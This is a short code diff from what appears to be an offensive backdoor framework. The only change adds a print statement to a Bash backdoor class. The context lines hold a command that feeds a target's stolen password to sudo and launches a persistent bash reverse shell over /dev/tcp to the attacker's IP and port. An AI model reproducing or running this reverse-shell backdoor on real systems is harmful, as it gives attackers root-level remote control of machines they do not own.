@@ -19,6 +19,7 @@ class Bash(Backdoor):
         return "echo " + self.core.curtarget.pword + " | sudo -S nohup bash -i >& /dev/tcp/" + self.core.localIP + "/%s 0>&1" % self.get_value("port")
 
     def do_exploit(self, args):
+        print Backdoor.location
         port = self.get_value("port")
         target = self.core.curtarget
         print(GOOD + "Initializing backdoor...")
